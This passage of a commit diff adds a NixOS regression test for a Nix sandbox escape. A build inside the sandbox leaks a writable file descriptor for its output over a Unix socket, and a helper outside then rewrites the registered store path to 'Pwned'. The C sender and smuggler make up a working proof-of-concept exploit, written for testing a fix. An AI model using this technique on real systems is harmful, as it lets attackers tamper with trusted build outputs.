          "14: # sandbox are killed before finalizing the output. What if we didn't need those",
          "15: # processes at all? Unix domain sockets have a semi-known trick: you can pass",
          "16: # file descriptors around!",
          "17: # This makes it possible to exfiltrate a file-descriptor with write access to",
          "18: # $out outside of the sandbox. And that file-descriptor can be used to modify",
          "19: # the contents of the store path after it has been registered.",
          "21: { config, ... }:",
          "23: let",
          "24:   pkgs = config.nodes.machine.nixpkgs.pkgs;",
          "26:   # Simple C program that sends a a file descriptor to `$out` to a Unix",
          "27:   # domain socket.",
          "28:   # Compiled statically so that we can easily send it to the VM and use it",
          "29:   # inside the build sandbox.",
          "30:   sender = pkgs.runCommandWith {",
          "31:     name = \"sender\";",
          "32:     stdenv = pkgs.pkgsStatic.stdenv;",
          "33:   } ''",
          "34:     $CC -static -o $out ${./sender.c}",
          "35:   '';",
          "37:   # Okay, so we have a file descriptor shipped out of the FOD now. But the",
          "38:   # Nix store is read-only, right? .. Well, yeah. But this file descriptor",
          "39:   # lives in a mount namespace where it is not! So even when this file exists",
          "40:   # in the actual Nix store, we're capable of just modifying its contents...",
          "41:   smuggler = pkgs.writeCBin \"smuggler\" (builtins.readFile ./smuggler.c);",
          "43:   # The abstract socket path used to exfiltrate the file descriptor",
          "44:   socketName = \"FODSandboxExfiltrationSocket\";",
          "45: in",
          "46: {",
          "47:   name = \"ca-fd-leak\";",
          "49:   nodes.machine =",
          "50:     { config, lib, pkgs, ... }:",
          "51:     { virtualisation.writableStore = true;",
          "52:       nix.settings.substituters = lib.mkForce [ ];",
          "53:       virtualisation.additionalPaths = [ pkgs.busybox-sandbox-shell sender smuggler pkgs.socat ];",
          "54:     };",
          "56:   testScript = { nodes }: ''",
          "57:     start_all()",
          "59:     machine.succeed(\"echo hello\")",
          "60:     # Start the smuggler server",
          "61:     machine.succeed(\"${smuggler}/bin/smuggler ${socketName} >&2 &\")",
          "63:     # Build the smuggled derivation.",
          "64:     # This will connect to the smuggler server and send it the file descriptor",
          "65:     machine.succeed(r\"\"\"",
          "66:       nix-build -E '",
          "67:         builtins.derivation {",
          "68:           name = \"smuggled\";",
          "69:           system = builtins.currentSystem;",
          "70:           # look ma, no tricks!",
          "71:           outputHashMode = \"flat\";",
          "72:           outputHashAlgo = \"sha256\";",
          "73:           outputHash = builtins.hashString \"sha256\" \"hello, world\\n\";",
          "74:           builder = \"${pkgs.busybox-sandbox-shell}/bin/sh\";",
          "75:           args = [ \"-c\" \"echo \\\"hello, world\\\" > $out; ''${${sender}} ${socketName}\" ];",
          "76:       }'",
          "77:     \"\"\".strip())",
          "80:     # Tell the smuggler server that we're done",
          "81:     machine.execute(\"echo done | ${pkgs.socat}/bin/socat - ABSTRACT-CONNECT:${socketName}\")",
          "83:     # Check that the file was not modified",
          "84:     machine.succeed(r\"\"\"",
          "85:       cat ./result",
          "86:       test \"$(cat ./result)\" = \"hello, world\"",
          "87:     \"\"\".strip())",
          "88:   '';",
          "90: }",
          "",
          "---------------"
        ],
        "tests/nixos/ca-fd-leak/sender.c||tests/nixos/ca-fd-leak/sender.c": [
          "File: tests/nixos/ca-fd-leak/sender.c -> tests/nixos/ca-fd-leak/sender.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: #include <sys/socket.h>",
          "2: #include <sys/un.h>",
          "3: #include <stdlib.h>",
          "4: #include <stddef.h>",
          "5: #include <stdio.h>",
          "6: #include <unistd.h>",
          "7: #include <fcntl.h>",
          "8: #include <errno.h>",
          "9: #include <string.h>",
          "10: #include <assert.h>",
          "12: int main(int argc, char **argv) {",
          "14:     assert(argc == 2);",
          "16:     int sock = socket(AF_UNIX, SOCK_STREAM, 0);",
          "19:     struct sockaddr_un data;",
          "20:     data.sun_family = AF_UNIX;",
          "21:     data.sun_path[0] = 0;",
          "22:     strcpy(data.sun_path + 1, argv[1]);",
          "26:     int res = -1;",
          "27:     while (res < 0) {",
          "28:         res = connect(sock, (const struct sockaddr *)&data,",
          "29:             offsetof(struct sockaddr_un, sun_path)",
          "30:               + strlen(argv[1])",
          "31:               + 1);",
          "32:         if (res < 0 && errno != ECONNREFUSED) perror(\"connect\");",
          "33:         if (errno != ECONNREFUSED) break;",
          "34:     }",
          "37:     struct msghdr msg = {0};",
          "38:     msg.msg_control = malloc(128);",
          "39:     msg.msg_controllen = 128;",
          "42:     struct cmsghdr *hdr = CMSG_FIRSTHDR(&msg);",
          "43:     hdr->cmsg_len = CMSG_LEN(sizeof(int));",
          "44:     hdr->cmsg_level = SOL_SOCKET;",
          "45:     hdr->cmsg_type = SCM_RIGHTS;",
          "46:     int fd = open(getenv(\"out\"), O_RDWR | O_CREAT, 0640);",
          "47:     memcpy(CMSG_DATA(hdr), (void *)&fd, sizeof(int));",
          "49:     msg.msg_controllen = CMSG_SPACE(sizeof(int));",
          "52:     msg.msg_iov = malloc(sizeof(struct iovec));",
          "53:     msg.msg_iov[0].iov_base = \"\";",
          "54:     msg.msg_iov[0].iov_len = 1;",
          "55:     msg.msg_iovlen = 1;",
          "58:     res = sendmsg(sock, &msg, 0);",
          "59:     if (res < 0) perror(\"sendmsg\");",
          "60:     int buf;",
          "64:     recv(sock, (void *)&buf, sizeof(int), 0);",
          "65: }",
          "",
          "---------------"
        ],
        "tests/nixos/ca-fd-leak/smuggler.c||tests/nixos/ca-fd-leak/smuggler.c": [
          "File: tests/nixos/ca-fd-leak/smuggler.c -> tests/nixos/ca-fd-leak/smuggler.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: #include <sys/socket.h>",
          "2: #include <sys/un.h>",
          "3: #include <stdlib.h>",
          "4: #include <stddef.h>",
          "5: #include <stdio.h>",
          "6: #include <unistd.h>",
          "7: #include <assert.h>",
          "9: int main(int argc, char **argv) {",
          "11:     assert(argc == 2);",
          "13:     int sock = socket(AF_UNIX, SOCK_STREAM, 0);",
          "16:     struct sockaddr_un data;",
          "17:     data.sun_family = AF_UNIX;",
          "18:     data.sun_path[0] = 0;",
          "19:     strcpy(data.sun_path + 1, argv[1]);",
          "20:     int res = bind(sock, (const struct sockaddr *)&data,",
          "21:         offsetof(struct sockaddr_un, sun_path)",
          "22:         + strlen(argv[1])",
          "23:         + 1);",
          "24:     if (res < 0) perror(\"bind\");",
          "26:     res = listen(sock, 1);",
          "27:     if (res < 0) perror(\"listen\");",
          "29:     int smuggling_fd = -1;",
          "32:     fprintf(stderr, \"%s\\n\", \"Waiting for the first connection\");",
          "33:     int a = accept(sock, 0, 0);",
          "34:     if (a < 0) perror(\"accept\");",
          "36:     struct msghdr msg = {0};",
          "37:     msg.msg_control = malloc(128);",
          "38:     msg.msg_controllen = 128;",
          "41:     recvmsg(a, &msg, 0);",
          "43:     struct cmsghdr *hdr = CMSG_FIRSTHDR(&msg);",
          "44:     while (hdr) {",
          "45:         if (hdr->cmsg_level == SOL_SOCKET",
          "46:           && hdr->cmsg_type == SCM_RIGHTS) {",
          "49:             memcpy((void *)&smuggling_fd, CMSG_DATA(hdr), sizeof(int));",
          "50:         }",
          "52:         hdr = CMSG_NXTHDR(&msg, hdr);",
          "53:     }",
          "54:     fprintf(stderr, \"%s\\n\", \"Got the file descriptor. Now waiting for the second connection\");",
          "55:     close(a);",
          "59:     a = accept(sock, 0, 0);",
          "60:     fprintf(stderr, \"%s\\n\", \"Got a second connection, rewriting the file\");",
          "62:     if (ftruncate(smuggling_fd, 0)) perror(\"ftruncate\");",
          "63:     char * new_content = \"Pwned\\n\";",
          "64:     int written_bytes = write(smuggling_fd, new_content, strlen(new_content));",
          "65:     if (written_bytes != strlen(new_content)) perror(\"write\");",
          "66: }",
          "",
          "---------------"
        ]
      }
    }
  ]
}